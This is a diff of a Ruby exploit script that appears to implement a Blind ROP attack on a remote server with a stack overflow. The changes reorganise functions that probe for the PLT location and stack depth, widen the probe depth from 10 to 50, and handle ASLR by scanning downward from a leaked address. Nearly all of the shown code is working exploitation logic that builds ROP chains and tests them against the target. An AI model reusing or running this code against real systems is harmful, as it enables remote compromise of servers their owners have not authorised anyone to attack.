@@ -123,7 +123,7 @@ class State
 	
 	def save
 		jsonStr = JSON.pretty_generate(self)
-		File.open("state.json", "w") { |file| file.write(jsonStr)} 
+		File.open("state.json", "w") { |file| file.write(jsonStr) } 
 	end
 
 	def load
@@ -1177,23 +1177,60 @@ def do_check_vsyscall()
 	exit(1)
 end
 
-def determine_target()
-	if $state.overflow_len == 4192 and $vsyscall_mode == VSYSCALL_NEW
-#		$state.depth = 16
-		$state.depth = 10
-		$state.pad = 2
-	end
 
-	print("Pad #{$state.pad} Depth #{$state.depth}\n")
+def find_plt_depth_aslr()
+	print("PLT AT #{$state.aslr.to_s(16)}\n")
+	start = 0x7fd10a00d000
+	$state.depth = 32
+	$state.pad = 0
+	len = 0x10000
+
+	start = $state.aslr & ~0xfff
+
+	while not $state.plt
+		find_plt(2, start, len)
+
+		start -= len
+
+		break if $state.plt
+
+		print("\n nope\n")
+	end
 end
 
-def find_plt(dep = 0, start = $text, len = 0x10000)
+def find_plt_depth()
+	if $state.aslr
+		find_plt_depth_aslr()
+		return
+	end
+
+	$state.depth = 18
+	$state.pad   = 0
+
+	probe_depth = 50  # How far down to probe befor giving up.
+	find_plt(probe_depth)
+
+#	if not $state.plt
+#		print("Assuming conf worker = 1\n")
+#		$state.depth = 10
+#		find_plt(2)
+#	end
+
+	return if not $state.plt
+
+	check_pad()
+
+	# dmccrady:  This is hard-coded, but not by me.
+	$state.ret   = 0x430000
+end
+
+def find_plt(probe_depth = 0, start = $text, len = 0x1000)
 	plt  = start
 	plt += 0x5000  # dmccrady: cheat just to make it faster.
 	plte = plt + len
 
 	while true
-		for d in 0..dep
+		for d in 0..probe_depth
 			print("Trying PLT at #{plt.to_s(16)} and depth #{$state.depth+d}         \r")
 			if try_plt($state.depth + d, plt)
 				$state.plt = plt
@@ -1217,11 +1254,10 @@ end
 
 def try_plt(depth, plt)
 	rop = Array.new(depth, plt)
-
 	r = try_exp(rop)
+
 	if r == true
 		rop = Array.new(depth, plt + 6)
-
 		return true if try_exp(rop)
 	end
 
@@ -1643,51 +1679,6 @@ def find_gadget()
 
 end
 
-def find_plt_depth_aslr()
-	print("PLT AT #{$state.aslr.to_s(16)}\n")
-	start = 0x7fd10a00d000
-	$state.depth = 32
-	$state.pad = 0
-	len = 0x10000
-
-	start = $state.aslr & ~0xfff
-
-	while not $state.plt
-		find_plt(2, start, len)
-
-		start -= len
-
-		break if $state.plt
-
-		print("\n nope\n")
-	end
-end
-
-def find_plt_depth()
-	if $state.aslr
-		find_plt_depth_aslr()
-		return
-	end
-
-	$state.depth = 18
-	$state.pad   = 0
-
-	probe_depth = 10  # Shouldn't need more than this
-	find_plt(probe_depth)
-
-#	if not $state.plt
-#		print("Assuming conf worker = 1\n")
-#		$state.depth = 10
-#		find_plt(2)
-#	end
-
-	return if not $state.plt
-
-	check_pad()
-
-	# dmccrady:  This is hard-coded, but not by me.
-	$state.ret   = 0x430000
-end
 
 def try_strcmp(entry, arg1, arg2)
 	rop = []
